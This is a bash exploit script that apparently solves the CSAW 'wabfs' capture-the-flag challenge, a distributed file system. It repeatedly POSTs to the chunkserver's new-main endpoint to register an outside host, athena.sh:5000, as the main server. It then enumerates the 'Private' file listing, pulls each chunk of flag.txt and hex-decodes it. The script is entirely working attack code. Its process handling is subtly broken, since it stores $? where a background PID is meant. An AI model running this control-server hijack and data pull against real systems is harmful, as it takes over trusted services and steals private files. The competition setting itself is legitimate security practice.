#!/usr/bin/env bash

cs="${1:-wabfs.chal.csaw.io}:5001"
ma="${1:-wabfs.chal.csaw.io}:5000"

python3 app.py &>/dev/null &
PID1=$?

{
    while true; do
        curl http://$cs/chunkserver/new-main -XPOST \
             --data '{"Address": "http://athena.sh:5000", "APIKey": "abc123"}' -q;
    done
} &>/dev/null &
PID2=$?

{
    for id in $(curl http://$ma/main/files/Private -q 2>/dev/null | jq '.files | to_entries | .[] | select(.value.Filename == "flag.txt") | .value.Chunks[].Id' -r); do
        DATA=$(curl http://$cs/chunkserver/read/Private/$id -s | jq '.Data' -r 2>/dev/null)
        until [ -n "${DATA}" ]; do
            DATA=$(curl http://$cs/chunkserver/read/Private/$id -s | jq '.Data' -r 2>/dev/null)
        done
        echo $DATA | unhex
    done
}


kill $PID1 $PID2 &>/dev/null


